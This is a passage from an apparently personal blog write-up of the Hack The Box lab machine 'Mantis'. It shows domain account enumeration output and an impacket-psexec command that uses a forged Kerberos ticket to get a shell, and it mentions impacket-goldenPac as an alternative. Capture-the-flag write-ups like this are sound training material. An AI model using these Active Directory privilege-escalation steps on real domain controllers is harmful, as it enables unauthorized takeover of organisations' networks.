+<span style="color: #AE81FF">520</span>:<span style="color: #F8F8F2"> </span>HTB<span style="color: #AE81FF">\G</span>roup<span style="color: #F8F8F2"> </span>Policy<span style="color: #F8F8F2"> </span>Creator<span style="color: #F8F8F2"> </span>Owners<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>SidTypeGroup<span style="color: #FF4689">)</span>
+<span style="color: #AE81FF">521</span>:<span style="color: #F8F8F2"> </span>HTB<span style="color: #AE81FF">\R</span>ead-only<span style="color: #F8F8F2"> </span>Domain<span style="color: #F8F8F2"> </span>Controllers<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>SidTypeGroup<span style="color: #FF4689">)</span>
+<span style="color: #AE81FF">553</span>:<span style="color: #F8F8F2"> </span>HTB<span style="color: #AE81FF">\R</span>AS<span style="color: #F8F8F2"> </span>and<span style="color: #F8F8F2"> </span>IAS<span style="color: #F8F8F2"> </span>Servers<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>SidTypeAlias<span style="color: #FF4689">)</span>
+<span style="color: #AE81FF">571</span>:<span style="color: #F8F8F2"> </span>HTB<span style="color: #AE81FF">\A</span>llowed<span style="color: #F8F8F2"> </span>RODC<span style="color: #F8F8F2"> </span>Password<span style="color: #F8F8F2"> </span>Replication<span style="color: #F8F8F2"> </span>Group<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>SidTypeAlias<span style="color: #FF4689">)</span>
+<span style="color: #AE81FF">572</span>:<span style="color: #F8F8F2"> </span>HTB<span style="color: #AE81FF">\D</span>enied<span style="color: #F8F8F2"> </span>RODC<span style="color: #F8F8F2"> </span>Password<span style="color: #F8F8F2"> </span>Replication<span style="color: #F8F8F2"> </span>Group<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>SidTypeAlias<span style="color: #FF4689">)</span>
+<span style="color: #AE81FF">1000</span>:<span style="color: #F8F8F2"> </span>HTB<span style="color: #AE81FF">\M</span>ANTIS$<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>SidTypeUser<span style="color: #FF4689">)</span>
+<span style="color: #AE81FF">1101</span>:<span style="color: #F8F8F2"> </span>HTB<span style="color: #AE81FF">\D</span>nsAdmins<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>SidTypeAlias<span style="color: #FF4689">)</span>
+<span style="color: #AE81FF">1102</span>:<span style="color: #F8F8F2"> </span>HTB<span style="color: #AE81FF">\D</span>nsUpdateProxy<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>SidTypeGroup<span style="color: #FF4689">)</span>
+<span style="color: #AE81FF">1103</span>:<span style="color: #F8F8F2"> </span>HTB<span style="color: #AE81FF">\j</span>ames<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>SidTypeUser<span style="color: #FF4689">)</span>
+<span style="color: #AE81FF">1104</span>:<span style="color: #F8F8F2"> </span>HTB<span style="color: #AE81FF">\S</span>QLServer2005SQLBrowserUser<span style="color: #F8F8F2">$MANTIS </span><span style="color: #FF4689">(</span>SidTypeAlias<span style="color: #FF4689">)</span>
+ma1ware@shadow:~/pentest/htb/boxes/Mantis$
+</code></pre></div>
+
+<p>Setting up metasploit and running we succeed!</p>
+<p><img alt="&quot;Metasploit&quot;" src="../imgs/assets-mantis/msf.png" /></p>
+<p>Yeah, no it didn't work </p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>ma1ware@shadow:~/pentest/htb/boxes/Mantis$<span style="color: #F8F8F2"> KRB5CCNAME</span><span style="color: #FF4689">=</span>20230726183221_default_10.129.165.179_mit.kerberos.cca_175363.bin<span style="color: #F8F8F2"> </span>impacket-psexec<span style="color: #F8F8F2"> </span>-k<span style="color: #F8F8F2"> </span>-no-pass<span style="color: #F8F8F2"> </span>james@htb.local
+Impacket<span style="color: #F8F8F2"> </span>v0.10.0<span style="color: #F8F8F2"> </span>-<span style="color: #F8F8F2"> </span>Copyright<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2022</span><span style="color: #F8F8F2"> </span>SecureAuth<span style="color: #F8F8F2"> </span>Corporation
+
+<span style="color: #FF4689">[</span>-<span style="color: #FF4689">]</span><span style="color: #F8F8F2"> </span>SMB<span style="color: #F8F8F2"> </span>SessionError:<span style="color: #F8F8F2"> </span>STATUS_MORE_PROCESSING_REQUIRED<span style="color: #FF4689">({</span>Still<span style="color: #F8F8F2"> </span>Busy<span style="color: #FF4689">}</span><span style="color: #F8F8F2"> </span>The<span style="color: #F8F8F2"> </span>specified<span style="color: #F8F8F2"> </span>I/O<span style="color: #F8F8F2"> </span>request<span style="color: #F8F8F2"> </span>packet<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>IRP<span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span>cannot<span style="color: #F8F8F2"> </span>be<span style="color: #F8F8F2"> </span>disposed<span style="color: #F8F8F2"> </span>of<span style="color: #F8F8F2"> </span>because<span style="color: #F8F8F2"> </span>the<span style="color: #F8F8F2"> </span>I/O<span style="color: #F8F8F2"> </span>operation<span style="color: #F8F8F2"> </span>is<span style="color: #F8F8F2"> </span>not<span style="color: #F8F8F2"> </span>complete.<span style="color: #FF4689">)</span>
+</code></pre></div>
+
+<p>Right, this is awkward, let's just pretend this never happened.</p>
+<p>Just kidding, it's just an issue with our time, let's sync it with the dc and generate the ticket again</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>$<span style="color: #F8F8F2"> </span>sudo<span style="color: #F8F8F2"> </span>rdate<span style="color: #F8F8F2"> </span>-n<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">10</span>.129.165.179<span style="color: #F8F8F2"> </span>
+</code></pre></div>
+
+<p>Re-generating the exploit, and boom we get a shell</p>
+<p><img alt="&quot;Shell using msf generated ticket&quot;" src="../imgs/assets-mantis/msf-ticket.png" /></p>
+<h2 id="non-metasploit-method">Non-metasploit method</h2>
+<p>Another way to exploit this would be to use the <code>impacket-goldenPac</code> script.</p>
+<p><img alt="&quot;Alternative method&quot;" src="../imgs/assets-mantis/alternative-root.png" /></p>
+<p>If you really felt like it you can also use the exploit on SecWiki since that isn't as automated as much.</p>
+<p>Anyway that's the box!</p>
+  </article>
+
+  <footer class="site-footer">
+    <div class="footer-links">
+      <a href="https://github.com/0xma1ware" target="_blank" rel="noopener">GitHub</a>
+      <a href="https://x.com/0xma1ware" target="_blank" rel="noopener">X / Twitter</a>
+      <a href="mailto:ma1ware@protonmail.com">Email</a>
+    </div>
+    <p>&copy; 2025 0xma1ware. All rights reserved.</p>
+  </footer>
+</body>
+</html>
